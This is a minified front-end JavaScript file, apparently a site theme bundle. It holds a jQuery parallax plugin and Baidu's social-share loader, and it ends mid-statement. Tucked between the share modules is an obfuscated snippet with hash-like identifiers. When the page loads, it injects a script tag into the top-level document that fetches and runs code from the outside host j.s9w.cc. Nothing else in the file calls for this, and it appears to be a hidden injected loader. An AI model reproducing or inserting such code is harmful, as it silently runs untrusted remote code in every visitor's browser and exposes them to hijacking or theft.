originalBackgroundPositionLeft:isNaN(parseInt(c[0],10))?0:parseInt(c[0],10),originalBackgroundPositionTop:isNaN(parseInt(c[1],10))?0:parseInt(c[1],10),originalPositionLeft:b.position().left,originalPositionTop:b.position().top,parallaxDistanceX:b.data("parallaxify-background-range-x")!==d?b.data("parallaxify-background-range-x"):b.data("parallaxify-background-range")!==d?b.data("parallaxify-background-range"):0,parallaxDistanceY:b.data("parallaxify-background-range-y")!==d?b.data("parallaxify-background-range-y"):
b.data("parallaxify-background-range")!==d?b.data("parallaxify-background-range"):0})})}},_reset:function(){var a,c,b,e;for(e=this.elements.length-1;0<=e;e--)a=this.elements[e],c=a.$element.data("parallaxify-originalLeft"),b=a.$element.data("parallaxify-originalTop"),this._setPosition(a.$element,c,c,b,b),a.$element.data("parallaxify-originalLeft",null).data("parallaxify-originalLeft",null).data("parallaxify-elementIsActive",null).data("parallaxify-backgroundIsActive",null);for(e=this.backgrounds.length-
1;0<=e;e--)a=this.backgrounds[e],a.$element.data("parallaxify-backgroundOriginalLeft",null).data("parallaxify-backgroundOriginalTop",null).data("parallaxify-backgroundIsActive",null),s(a.$element,a.originalValueLeft,a.originalValueTop)},destroy:function(){this._reset();this.useMouseMove&&this.$viewportElement.unbind("mousemove."+this.name);this.useSensorWebkit&&g.removeEventListener("deviceorientation",this._handleSensorWebkit,!1);this.useSensorMoz&&g.removeEventListener("MozOrientation",this._handleSensorMoz,
!1);f(g).unbind("load."+this.name).unbind("resize."+this.name).unbind("orientationchange."+this.name)},_processSensorData:function(){if(this.useSensor){var a=this.beta,c=this.gamma,b=0,e=0;90<a&&(a-=180);180<c&&(c-=360);this.initialBeta===d&&null!==a&&(this.initialBeta=a,this.useSensor&&"gyroscope"===this.options.inputPriority&&(this.useMouseMove=!1));this.initialGamma===d&&null!==c&&(this.initialGamma=c,this.useSensor&&"gyroscope"===this.options.inputPriority&&(this.useMouseMove=!1));this.options.adjustBasePosition&&
(this.initialGamma!==d&&this.initialBeta!==d)&&(this.initialGamma=-180>c-this.initialGamma?j(c+360,this.initialGamma,this.options.alphaPosition):180<c-this.initialGamma?j(c-360,this.initialGamma,this.options.alphaPosition):j(c,this.initialGamma,this.options.alphaPosition),this.initialBeta=-90>a-this.initialBeta?j(a+180,this.initialBeta,this.options.alphaPosition):90<a-this.initialBeta?j(a-180,this.initialBeta,this.options.alphaPosition):j(a,this.initialBeta,this.options.alphaPosition));b=this.initialBeta!==
d?a-this.initialBeta:a;e=this.initialGamma!==d?c-this.initialGamma:c;100<b?b-=180:-100>b&&(b+=180);200<e?e-=360:-200>e&&(e+=360);b=j(b,this.tilt.beta,this.options.alphaFilter);e=j(e,this.tilt.gamma,this.options.alphaFilter);this.tilt.beta=b;this.tilt.gamma=e}},_repositionElements:function(){var a=this._getMoveHorizontal(),c=this._getMoveVertical(),b,e,d,f;if(!(this.currentMoveHorizontal===a&&this.currentMoveVertical===c&&this.currentWidth===this.viewportWidth&&this.currentHeight===this.viewportHeight)){this.currentMoveHorizontal=
a;this.currentMoveVertical=c;this.currentWidth=this.viewportWidth;this.currentHeight=this.viewportHeight;for(f=this.elements.length-1;0<=f;f--)b=this.elements[f],e=this.options.horizontalParallax?Math.floor(a*b.parallaxDistanceX/2)+b.originalPositionLeft:b.originalPositionLeft,d=this.options.verticalParallax?Math.floor(c*b.parallaxDistanceY/2)+b.originalPositionTop:b.originalPositionTop,this._setPosition(b.$element,e,b.originalPositionLeft,d,b.originalPositionTop);for(f=this.backgrounds.length-1;0<=
f;f--)b=this.backgrounds[f],e=this.options.horizontalParallax?Math.floor(a*b.parallaxDistanceX/2)+b.originalBackgroundPositionLeft+"px":b.originalValueLeft,d=this.options.verticalParallax?Math.floor(c*b.parallaxDistanceY/2)+b.originalBackgroundPositionTop+"px":b.originalValueTop,s(b.$element,e,d)}},_handleWindowLoadAndResize:function(){var a=this,c=f(g);a.options.responsive&&c.bind("load."+this.name,function(){a.refresh()});c.bind("resize."+this.name,function(){a._detectViewport();a.options.responsive&&
a.refresh()});c.bind("orientationchange."+this.name,function(){a._detectViewport();a.options.responsive&&a.refresh()})},_startAnimation:function(){var a=this,c=!1;this.gamma=this.beta=0;this.clientX=this.oldClientX=Math.round(a.viewportWidth/2);this.clientY=this.oldClientY=Math.round(a.viewportHeight/2);var b=function(){a._processSensorData();a._repositionElements();c=!1},e=function(){c||(y(b),c=!0)};this._handleSensorWebkit=function(b){a.gamma=b.gamma;a.beta=b.beta;e()};this._handleSensorMoz=function(b){a.gamma=
180*b.x;a.beta=-90*b.y;e()};this._handleMouseMove=function(b){a.oldClientX=a.clientX;a.oldClientY=a.clientY;b.clientX!==d?a.clientX=b.clientX:a.clientX=b.pageX;b.clientY!==d?a.clientY=b.clientY:a.clientY=b.pageY;e()};this.useSensorWebkit?g.addEventListener("deviceorientation",a._handleSensorWebkit,!1):this.useSensorMoz&&g.addEventListener("MozOrientation",a._handleSensorMoz,!1);this.useMouseMove&&this.$viewportElement.bind("mousemove."+this.name,a._handleMouseMove);e()}};f.fn[h]=function(a){var c=
arguments;if(a===d||"object"===typeof a)return this.each(function(){f.data(this,"plugin_"+h)||f.data(this,"plugin_"+h,new m(this,a))});if("string"===typeof a&&"_"!==a[0]&&"init"!==a)return this.each(function(){var b=f.data(this,"plugin_"+h);b instanceof m&&"function"===typeof b[a]&&b[a].apply(b,Array.prototype.slice.call(c,1));"destroy"===a&&f.data(this,"plugin_"+h,null)})};f[h]=function(a){var c=f(g);return c[h].apply(c,Array.prototype.slice.call(arguments,0))};f[h].positionProperty=u;f[h].motionType=
p;g[h]=m})(jQuery,this,document);

window._bd_share_main?window._bd_share_is_recently_loaded=!0:(window._bd_share_is_recently_loaded=!1,window._bd_share_main={version:"2.0",jscfg:{domain:{staticUrl:yiliaConfig.rootUrl}}}),!window._bd_share_is_recently_loaded&&(window._bd_share_main.F=window._bd_share_main.F||function(e,t){function n(e,t){if(e instanceof Array){for(var n=0,s=e.length;s>n;n++)if(t.call(e[n],e[n],n)===!1)return}else for(var n in e)if(e.hasOwnProperty(n)&&t.call(e[n],e[n],n)===!1)return}function s(e,t){if(this.svnMod="",this.name=null,this.path=e,this.fn=null,this.exports={},this._loaded=!1,this._requiredStack=[],this._readyStack=[],s.cache[this.path]=this,t&&"."!==t.charAt(0)){var n=t.split(":");n.length>1?(this.svnMod=n[0],this.name=n[1]):this.name=t}this.svnMod||(this.svnMod=this.path.split("/js/")[0].substr(1)),this.type="js",this.getKey=function(){return this.svnMod+":"+this.name},this._info={}}function i(e,t){var n="css"==t,s=document.createElement(n?"link":"script");return s}function a(t,n,s,a){function c(){c.isCalled||(c.isCalled=!0,clearTimeout(_),s&&s())}var d=i(t,n);"SCRIPT"===d.nodeName?r(d,c):o(d,c);var _=setTimeout(function(){throw new Error("load "+n+" timeout : "+t)},e._loadScriptTimeout||1e4),l=document.getElementsByTagName("head")[0];"css"==n?(d.rel="stylesheet",d.href=t,l.appendChild(d)):(d.type="text/javascript",d.src=t,l.insertBefore(d,l.firstChild))}function r(e,t){e.onload=e.onerror=e.onreadystatechange=function(){if(/loaded|complete|undefined/.test(e.readyState)){if(e.onload=e.onerror=e.onreadystatechange=null,e.parentNode){e.parentNode.removeChild(e);try{if(e.clearAttributes)e.clearAttributes();else for(var n in e)delete e[n]}catch(s){}}e=void 0,t&&t()}}}function o(e,t){e.attachEvent?e.attachEvent("onload",t):setTimeout(function(){c(e,t)},0)}function c(e,t){if(!t||!t.isCalled){var n,s=navigator.userAgent,i=~s.indexOf("AppleWebKit"),a=~s.indexOf("Opera");if(i||a)e.sheet&&(n=!0);else if(e.sheet)try{e.sheet.cssRules&&(n=!0)}catch(r){("SecurityError"===r.name||"NS_ERROR_DOM_SECURITY_ERR"===r.name)&&(n=!0)}setTimeout(function(){n?t&&t():c(e,t)},1)}}var d="api";e.each=n,s.currentPath="",s.loadedPaths={},s.loadingPaths={},s.cache={},s.paths={},s.handlers=[],s.moduleFileMap={},s.requiredPaths={},s.lazyLoadPaths={},s.services={},s.isPathsLoaded=function(e){var t=!0;return n(e,function(e){return e in s.loadedPaths?void 0:t=!1}),t},s.require=function(e,t){e.search(":")<0&&(t||(t=d,s.currentPath&&(t=s.currentPath.split("/js/")[0].substr(1))),e=t+":"+e);var n=s.get(e,s.currentPath);if("css"!=n.type){if(n){if(!n._inited){n._inited=!0;var i,a=n.svnMod;(i=n.fn.call(null,function(e){return s.require(e,a)},n.exports,new h(n.name,a)))&&(n.exports=i)}return n.exports}throw new Error('Module "'+e+'" not found!')}},s.baseUrl=t?"/"==t[t.length-1]?t:t+"/":"/",s.getBasePath=function(e){var t,n;return-1!==(n=e.indexOf("/"))&&(t=e.slice(0,n)),t&&t in s.paths?s.paths[t]:s.baseUrl},s.getJsPath=function(t,n){if("."===t.charAt(0)){n=n.replace(/\/[^\/]+\/[^\/]+$/,""),0===t.search("./")&&(t=t.substr(2));var i=0;for(t=t.replace(/^(\.\.\/)+/g,function(e){return i=e.length/3,""});i>0;)n=n.substr(0,n.lastIndexOf("/")),i--;return n+"/"+t+"/"+t.substr(t.lastIndexOf("/")+1)+".js"}var a,r,o,c,_,l;if(t.search(":")>=0){var h=t.split(":");a=h[0],t=h[1]}else n&&(a=n.split("/")[1]);a=a||d;var u=/\.css(?:\?|$)/i.test(t);u&&e._useConfig&&s.moduleFileMap[a][t]&&(t=s.moduleFileMap[a][t]);var t=_=t,f=s.getBasePath(t);return-1!==(o=t.indexOf("/"))&&(r=t.slice(0,o),c=t.lastIndexOf("/"),_=t.slice(c+1)),r&&r in s.paths&&(t=t.slice(o+1)),l=f+a+"/js/"+t+".js"},s.get=function(e,t){var n=s.getJsPath(e,t);return s.cache[n]?s.cache[n]:new s(n,e)},s.prototype={load:function(){s.loadingPaths[this.path]=!0;var t=this.svnMod||d,n=window._bd_share_main.jscfg.domain.staticUrl+"static/"+t+"/",i=this,a=/\.css(?:\?|$)/i.test(this.name);this.type=a?"css":"js";var r="/"+this.type+"/"+s.moduleFileMap[t][this.name];if(n+=e._useConfig&&s.moduleFileMap[t][this.name]?this.type+"/"+s.moduleFileMap[t][this.name]:this.type+"/"+this.name+(a?"":".js"),e._firstScreenCSS.indexOf(this.name)>0||e._useConfig&&r==e._firstScreenJS)i._loaded=!0,i.ready();else{var o=(new Date).getTime();_.create({src:n,type:this.type,loaded:function(){i._info.loadedTime=(new Date).getTime()-o,"css"==i.type&&(i._loaded=!0,i.ready())}})}},lazyLoad:function(){if(this.name,s.lazyLoadPaths[this.getKey()])this.define(),delete s.lazyLoadPaths[this.getKey()];else{if(this.exist())return;s.requiredPaths[this.getKey()]=!0,this.load()}},ready:function(e,t){var i=t?this._requiredStack:this._readyStack;if(e)this._loaded?e():i.push(e);else{if(s.loadedPaths[this.path]=!0,delete s.loadingPaths[this.path],this._loaded=!0,s.currentPath=this.path,this._readyStack&&this._readyStack.length>0){this._inited=!0;var a,r=this.svnMod;this.fn&&(a=this.fn.call(null,function(e){return s.require(e,r)},this.exports,new h(this.name,r)))&&(this.exports=a),n(this._readyStack,function(e){e()}),delete this._readyStack}this._requiredStack&&this._requiredStack.length>0&&(n(this._requiredStack,function(e){e()}),delete this._requiredStack)}},define:function(){var e=this,t=this.deps,i=(this.path,[]);t||(t=this.getDependents()),t.length?(n(t,function(t){i.push(s.getJsPath(t,e.path))}),n(t,function(t){var n=s.get(t,e.path);n.ready(function(){s.isPathsLoaded(i)&&e.ready()},!0),n.lazyLoad()})):this.ready()},exist:function(){var e=this.path;return e in s.loadedPaths||e in s.loadingPaths},getDependents:function(){var e=this.fn.toString(),t=e.match(/function\s*\(([^,]*),/i),s=new RegExp("[^.]\\b"+t[1]+"\\(\\s*('|\")([^()\"']*)('|\")\\s*\\)","g"),i=e.match(s),a=[];return i&&n(i,function(e,n){a[n]=e.substr(t[1].length+3).slice(0,-2)}),a}};var _={create:function(e){var t=e.src;t in this._paths||(this._paths[t]=!0,n(this._rules,function(e){t=e.call(null,t)}),a(t,e.type,e.loaded))},_paths:{},_rules:[],addPathRule:function(e){this._rules.push(e)}};e.version="1.0",e.use=function(e,t){"string"==typeof e&&(e=[e]);var i=[],a=[];n(e,function(e,t){a[t]=!1}),n(e,function(e,r){var o=s.get(e),c=o._loaded;o.ready(function(){var e=o.exports||{};e._INFO=o._info,e._INFO&&(e._INFO.isNew=!c),i[r]=e,a[r]=!0;var s=!0;n(a,function(e){return e===!1?s=!1:void 0}),t&&s&&t.apply(null,i)}),o.lazyLoad()})},e.module=function(e,t,n){var i=s.get(e);i.fn=t,i.deps=n,s.requiredPaths[i.getKey()]?i.define():s.lazyLoadPaths[i.getKey()]=!0},e.pathRule=function(e){_.addPathRule(e)},e._addPath=function(e,t){if("/"!==t.slice(-1)&&(t+="/"),e in s.paths)throw new Error(e+" has already in Module.paths");s.paths[e]=t};var l=d;e._setMod=function(e){l=e||d},e._fileMap=function(t,i){if("object"==typeof t)n(t,function(t,n){e._fileMap(n,t)});else{var a=l;"string"==typeof i&&(i=[i]),t=1==t.indexOf("js/")?t.substr(4):t,t=1==t.indexOf("css/")?t.substr(5):t;var r=s.moduleFileMap[a];r||(r={}),n(i,function(e){r[e]||(r[e]=t)}),s.moduleFileMap[a]=r}},e._eventMap={},e.call=function(t,n,s){for(var i=[],a=2,r=arguments.length;r>a;a++)i.push(arguments[a]);e.use(t,function(e){for(var t=n.split("."),s=0,a=t.length;a>s;s++)e=e[t[s]];e&&e.apply(this,i)})},e._setContext=function(e){"object"==typeof e&&n(e,function(e,t){h.prototype[t]=s.require(e)})},e._setContextMethod=function(e,t){h.prototype[e]=t};var h=function(e,t){this.modName=e,this.svnMod=t};return h.prototype={domain:window._bd_share_main.jscfg.domain,use:function(t,n){"string"==typeof t&&(t=[t]);for(var s=t.length-1;s>=0;s--)t[s]=this.svnMod+":"+t[s];e.use(t,n)}},e._Context=h,e.addLog=function(t,n){e.use("lib/log",function(e){e.defaultLog(t,n)})},e.fire=function(t,n,s){e.use("lib/mod_evt",function(e){e.fire(t,n,s)})},e._defService=function(e,t){if(e){var i=s.services[e];i=i||{},n(t,function(e,t){i[t]=e}),s.services[e]=i}},e.getService=function(t,n,i){var a=s.services[t];if(!a)throw new Error(t+" mod didn't define any services");var r=a[n];if(!r)throw new Error(t+" mod didn't provide service "+n);e.use(t+":"+r,i)},e}({})),!window._bd_share_is_recently_loaded&&window._bd_share_main.F.module("base/min_tangram",function(e,t){var n={};n.each=function(e,t,n){var s,i,a,r=e.length;if("function"==typeof t)for(a=0;r>a&&(i=e[a],s=t.call(n||e,a,i),s!==!1);a++);return e};var s=function(e,t){for(var n in t)t.hasOwnProperty(n)&&(e[n]=t[n]);return e};n.extend=function(){for(var e=arguments[0],t=1,n=arguments.length;n>t;t++)s(e,arguments[t]);return e},n.domready=function(e,t){if(t=t||document,/complete/.test(t.readyState))e();else if(t.addEventListener)"interactive"==t.readyState?e():t.addEventListener("DOMContentLoaded",e,!1);else{var n=function(){n=new Function,e()};void function(){try{t.body.doScroll("left")}catch(e){return setTimeout(arguments.callee,10)}n()}(),t.attachEvent("onreadystatechange",function(){"complete"==t.readyState&&n()})}},n.isArray=function(e){return"[object Array]"==Object.prototype.toString.call(e)},t.T=n}),!window._bd_share_is_recently_loaded&&window._bd_share_main.F.module("base/class",function(e,t,n){var s=e("base/min_tangram").T;t.BaseClass=function(){var e=this,t={};e.on=function(e,n){var s=t[e];s||(s=t[e]=[]),s.push(n)},e.un=function(e,n){if(!e)return void(t={});var i=t[e];i&&(n?s.each(i,function(e,t){return t==n?(i.splice(e,1),!1):void 0}):t[e]=[])},e.fire=function(n,i){var a=t[n];a&&(i=i||{},s.each(a,function(t,n){i._result=n.call(e,s.extend({_ctx:{src:e}},i))}))}};var i={};i.create=function(e,n){return n=n||t.BaseClass,function(){n.apply(this,arguments);var t=s.extend({},this);e.apply(this,arguments),this._super=t}},t.Class=i}),!window._bd_share_is_recently_loaded&&window._bd_share_main.F.module("conf/const",function(e,t,n){t.CMD_ATTR="data-cmd",t.CONFIG_TAG_ATTR="data-tag",t.URLS={likeSetUrl:"http://like.baidu.com/set",commitUrl:"http://s.share.baidu.com/commit",jumpUrl:"http://s.share.baidu.com",mshareUrl:"http://s.share.baidu.com/mshare",emailUrl:"http://s.share.baidu.com/sendmail",nsClick:"/",backUrl:"http://s.share.baidu.com/back",shortUrl:"http://dwz.cn/v2cut.php"}}),!window._bd_share_is_recently_loaded&&function(){window._bd_share_main.F._setMod("api"),window._bd_share_main.F._fileMap({"/js/share.js?v=da893e3e.js":["conf/define","base/fis","base/tangrammin","base/class.js","conf/define.js","conf/const.js","config","share/api_base.js","view/view_base.js","start/router.js","component/comm_tools.js","trans/trans.js"],"/js/base/tangram.js?v=37768233.js":["base/tangram"],"/js/view/share_view.js?v=3ae6026d.js":["view/share_view"],"/js/view/slide_view.js?v=08373964.js":["view/slide_view"],"/js/view/like_view.js?v=df3e0eca.js":["view/like_view"],"/js/view/select_view.js?v=85fc7cec.js":["view/select_view"],"/js/trans/data.js?v=17af2bd2.js":["trans/data"],"/js/trans/logger.js?v=d16ec0e3.js":["trans/logger"],"/js/trans/trans_bdxc.js?v=7ac21555.js":["trans/trans_bdxc"],"/js/trans/trans_bdysc.js?v=fc21acaa.js":["trans/trans_bdysc"],"/js/trans/trans_weixin.js?v=080be124.js":["trans/trans_weixin"],"/js/share/combine_api.js?v=8d37a7b3.js":["share/combine_api"],"/js/share/like_api.js?v=d3693f0a.js":["share/like_api"],"/js/share/likeshare.js?v=e1f4fbf1.js":["share/likeshare"],"/js/share/share_api.js?v=226108fe.js":["share/share_api"],"/js/share/slide_api.js?v=ec14f516.js":["share/slide_api"],"/js/component/animate.js?v=5b737477.js":["component/animate"],"/js/component/anticheat.js?v=44b9b245.js":["component/anticheat"],"/js/component/partners.js?v=911c4302.js":["component/partners"],"/js/component/pop_base.js?v=36f92e70.js":["component/pop_base"],"/js/component/pop_dialog.js?v=d479767d.js":["component/pop_dialog"],"/js/component/pop_popup.js?v=4387b4e1.js":["component/pop_popup"],"/js/component/pop_popup_slide.js?v=b16a1f10.js":["component/pop_popup_slide"],"/js/component/qrcode.js?v=d69754a9.js":["component/qrcode"],"/css/share_style0_16.css?v=6aba13f0.css":["share_style0_16.css"],"/css/share_style0_32.css?v=4413acf0.css":["share_style0_32.css"],"/css/share_style2.css?v=611d4f74.css":["share_style2.css"],"/css/share_style4.css?v=cef2b8f3.css":["share_style4.css"],"/css/slide_share.css?v=9c50d088.css":["slide_share.css"],"/css/share_popup.css?v=240f357d.css":["share_popup.css"],"/css/like.css?v=d52a0ea5.css":["like.css"],"/css/imgshare.css?v=a7830602.css":["imgshare.css"],"/css/select_share.css?v=15f56735.css":["select_share.css"],"/css/weixin_popup.css?v=1a56666e.css":["weixin_popup.css"]}),window._bd_share_main.F._loadScriptTimeout=15e3,window._bd_share_main.F._useConfig=!0,window._bd_share_main.F._firstScreenCSS="",window._bd_share_main.F._firstScreenJS=""}(),!window._bd_share_is_recently_loaded&&window._bd_share_main.F.use("base/min_tangram",function(e){function t(e,t,n){var s=new e(n);s.setView(new t(n)),s.init(),n&&n._handleId&&(_bd_share_main.api=_bd_share_main.api||{},_bd_share_main.api[n._handleId]=s)}function n(e,n){window._bd_share_main.F.use(e,function(e,s){i.isArray(n)?i.each(n,function(n,i){t(e.Api,s.View,i)}):t(e.Api,s.View,n)})}function s(e){var t=e.common||window._bd_share_config&&_bd_share_config.common||{},n={like:{type:"like"},share:{type:"share",bdStyle:0,bdMini:2,bdSign:"on"},slide:{type:"slide",bdStyle:"1",bdMini:2,bdImg:0,bdPos:"right",bdTop:100,bdSign:"on"},image:{viewType:"list",viewStyle:"0",viewPos:"top",viewColor:"black",viewSize:"16",viewList:["qzone","tsina","huaban","tqq","renren"]},selectShare:{type:"select",bdStyle:0,bdMini:2,bdSign:"on"}},s={share:{__cmd:"",__buttonType:"",__type:"",__element:null},slide:{__cmd:"",__buttonType:"",__type:"",__element:null},image:{__cmd:"",__buttonType:"",__type:"",__element:null}};return i.each(["like","share","slide","image","selectShare"],function(a,r){e[r]&&(i.isArray(e[r])&&e[r].length>0?i.each(e[r],function(a,o){e[r][a]=i.extend({},n[r],t,o,s[r])}):e[r]=i.extend({},n[r],t,e[r],s[r]))}),e}var i=e.T;_bd_share_main.init=function(e){if(e=e||window._bd_share_config||{share:{}}){var t=s(e);t.like&&n(["share/like_api","view/like_view"],t.like),t.share&&n(["share/share_api","view/share_view"],t.share),t.slide&&n(["share/slide_api","view/slide_view"],t.slide),t.selectShare&&n(["share/select_api","view/select_view"],t.selectShare),t.image&&n(["share/image_api","view/image_view"],t.image)}},window._bd_share_main._LogPoolV2=[],window._bd_share_main.n1=(new Date).getTime(),i.domready(function(){window._bd_share_main.n2=(new Date).getTime()+1e3,_bd_share_main.init(),setTimeout(function(){window._bd_share_main.F.use("trans/logger",function(e){e.nsClick(),e.back(),e.duration()})},3e3)})}),!window._bd_share_is_recently_loaded&&window._bd_share_main.F.module("component/comm_tools",function(e,t){var n=function(){var e=window.location||document.location||{};return e.href||""},s=function(e,t){for(var n=e.length,s="",i=1;t>=i;i++){var a=Math.floor(n*Math.random());s+=e.charAt(a)}return s},i=function(){var e=(+new Date).toString(36),t=s("0123456789abcdefghijklmnopqrstuvwxyz",3);return e+t};t.getLinkId=i,t.getPageUrl=n}),!window._bd_share_is_recently_loaded&&window._bd_share_main.F.module("trans/trans",function(e,t){var n=e("component/comm_tools"),s=e("conf/const").URLS,i=function(){window._bd_share_main.F.use("base/tangram",function(e){var t=e.T;null==t.cookie.get("bdshare_firstime")&&t.cookie.set("bdshare_firstime",1*new Date,{path:"/",expires:(new Date).setFullYear(2022)-new Date})})},a=function(e){var t=e.bdUrl||n.getPageUrl();return t=t.replace(/\'/g,"%27").replace(/\"/g,"%22")},r=function(e){var t=(new Date).getTime()+3e3,s={click:1,url:a(e),uid:e.bdUid||"0",to:e.__cmd,type:"text",pic:e.bdPic||"",title:(e.bdText||document.title).substr(0,300),key:(e.bdSnsKey||{})[e.__cmd]||"",desc:e.bdDesc||"",comment:e.bdComment||"",relateUid:e.bdWbuid||"",searchPic:e.bdSearchPic||0,sign:e.bdSign||"on",l:window._bd_share_main.n1.toString(32)+window._bd_share_main.n2.toString(32)+t.toString(32),linkid:n.getLinkId(),firstime:c("bdshare_firstime")||""};switch(e.__cmd){case"copy":_(s);break;case"print":l();break;case"bdxc":h();break;case"bdysc":u(s);break;case"weixin":f(s);break;default:o(e,s)}window._bd_share_main.F.use("trans/logger",function(t){t.commit(e,s)})},o=function(e,t){var n=s.jumpUrl;"mshare"==e.__cmd?n=s.mshareUrl:"mail"==e.__cmd&&(n=s.emailUrl);var i=n+"?"+d(t);window.open(i)},c=function(e){if(e){var t=new RegExp("(^| )"+e+"=([^;]*)(;|$)"),n=t.exec(document.cookie);if(n)return decodeURIComponent(n[2]||null)}},d=function(e){var t=[];for(var n in e)t.push(encodeURIComponent(n)+"="+encodeURIComponent(e[n]));return t.join("&").replace(/%20/g,"+")},_=function(e){window._bd_share_main.F.use("base/tangram",function(t){var s=t.T;s.browser.ie?(window.clipboardData.setData("text",document.title+" "+(e.bdUrl||n.getPageUrl())),alert("标题和链接复制成功，您可以推荐给QQ/MSN上的好友了！")):window.prompt("您使用的是非IE核心浏览器，请按下 Ctrl+C 复制代码到剪贴板",document.title+" "+(e.bdUrl||n.getPageUrl()))})},l=function(){window.print()},h=function(){window._bd_share_main.F.use("trans/trans_bdxc",function(e){e&&e.run()})},u=function(e){window._bd_share_main.F.use("trans/trans_bdysc",function(t){t&&t.run(e)})},f=function(e){window._bd_share_main.F.use("trans/trans_weixin",function(t){t&&t.run(e)})},p=function(e){r(e)};t.run=p,i()});
!window._bd_share_is_recently_loaded&&window._bd_share_main.F.module("base/class",function(e,t,n){var r=e("base/min_tangram").T;t.BaseClass=function(){var e=this,t={};e.on=function(e,n){var r=t[e];r||(r=t[e]=[]),r.push(n)},e.un=function(e,n){if(!e){t={};return}var i=t[e];i&&(n?r.each(i,function(e,t){if(t==n)return i.splice(e,1),!1}):t[e]=[])},e.fire=function(n,i){var s=t[n];s&&(i=i||{},r.each(s,function(t,n){i._result=n.call(e,r.extend({_ctx:{src:e}},i))}))}};var i={};i.create=function(e,n){return n=n||t.BaseClass,function(){n.apply(this,arguments);var i=r.extend({},this);e.apply(this,arguments),this._super=i}},t.Class=i});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("base/tangram",function(e,t){var n,r=n=function(){var e,t=e=t||function(e,n){return t.dom?t.dom(e,n):null};t.version="2.0.2.5",t.guid="$BAIDU$",t.key="tangram_guid";var n=window[t.guid]=window[t.guid]||{};return(n.versions||(n.versions=[])).push(t.version),t.check=t.check||function(){},t.lang=t.lang||{},t.forEach=function(e,t,n){var r,i,s;if(typeof t=="function"&&e){i=typeof e.length=="number"?e.length:e.byteLength;if(typeof i=="number"){if(Object.prototype.toString.call(e)==="[object Function]")return e;for(r=0;r<i;r++)s=e[r],s===undefined&&(s=e.charAt&&e.charAt(r)),t.call(n||null,s,r,e)}else if(typeof e=="number")for(r=0;r<e;r++)t.call(n||null,r,r,r);else if(typeof e=="object")for(r in e)e.hasOwnProperty(r)&&t.call(n||null,e[r],r,e)}return e},t.type=function(){var e={},n=[,"HTMLElement","Attribute","Text",,,,,"Comment","Document",,"DocumentFragment"],r="Array Boolean Date Error Function Number RegExp String",i={object:1,"function":"1"},s=e.toString;return t.forEach(r.split(" "),function(n){e["[object "+n+"]"]=n.toLowerCase(),t["is"+n]=function(e){return t.type(e)==n.toLowerCase()}}),function(t){var r=typeof t;return i[r]?t==null?"null":t._type_||e[s.call(t)]||n[t.nodeType]||(t==t.window?"Window":"")||"object":r}}(),t.isDate=function(e){return t.type(e)=="date"&&e.toString()!="Invalid Date"&&!isNaN(e)},t.isElement=function(e){return t.type(e)=="HTMLElement"},t.isEnumerable=function(e){return e!=null&&(typeof e=="object"||~Object.prototype.toString.call(e).indexOf("NodeList"))&&(typeof e.length=="number"||typeof e.byteLength=="number"||typeof e[0]!="undefined")},t.isNumber=function(e){return t.type(e)=="number"&&isFinite(e)},t.isPlainObject=function(e){var n,r=Object.prototype.hasOwnProperty;if(t.type(e)!="object")return!1;if(e.constructor&&!r.call(e,"constructor")&&!r.call(e.constructor.prototype,"isPrototypeOf"))return!1;for(n in e);return n===undefined||r.call(e,n)},t.isObject=function(e){return typeof e=="function"||typeof e=="object"&&e!=null},t.extend=function(e,n){var r,i,s,o,u,a=1,f=arguments.length,l=e||{},c,h;t.isBoolean(e)&&(a=2)&&(l=n||{}),!t.isObject(l)&&(l={});for(;a<f;a++){i=arguments[a];if(t.isObject(i))for(s in i){o=l[s],u=i[s];if(o===u)continue;t.isBoolean(e)&&e&&u&&(t.isPlainObject(u)||(c=t.isArray(u)))?(c?(c=!1,h=o&&t.isArray(o)?o:[]):h=o&&t.isPlainObject(o)?o:{},l[s]=t.extend(e,h,u)):u!==undefined&&(l[s]=u)}}return l},t.createChain=function(e,n,r){var i=e=="dom"?"$DOM":"$"+e.charAt(0).toUpperCase()+e.substr(1),s=Array.prototype.slice,o=t[e];return o?o:(o=t[e]=n||function(n){return t.extend(n,t[e].fn)},o.extend=function(n){var r;for(r in n)(function(n){n!="splice"&&(o[n]=function(){var r=arguments[0];e=="dom"&&t.type(r)=="string"&&(r="#"+r);var i=o(r),u=i[n].apply(i,s.call(arguments,1));return t.type(u)=="$DOM"?u.get(0):u})})(r);return t.extend(t[e].fn,n)},t[e][i]=t[e][i]||r||function(){},o.fn=t[e][i].prototype,o)},t.overwrite=function(e,t,n){for(var r=t.length-1;r>-1;r--)e.prototype[t[r]]=n(t[r]);return e},t.object=t.object||{},t.object.isPlain=t.isPlainObject,t.createChain("string",function(e){var n=t.type(e),r=new String(~"string|number".indexOf(n)?e:n),i=String.prototype;return t.forEach(t.string.$String.prototype,function(e,t){i[t]||(r[t]=e)}),r}),t.string.extend({trim:function(){var e=new RegExp("(^[\\s\\t\\xa0\\u3000]+)|([\\u3000\\xa0\\s\\t]+$)","g");return function(){return this.replace(e,"")}}()}),t.createChain("array",function(e){var n=t.array.$Array.prototype,r=Array.prototype,i;t.type(e)!="array"&&(e=[]);for(i in n)e[i]=n[i];return e}),t.overwrite(t.array.$Array,"concat slice".split(" "),function(e){return function(){return t.array(Array.prototype[e].apply(this,arguments))}}),t.array.extend({indexOf:function(e,n){t.check(".+(,number)?","baidu.array.indexOf");var 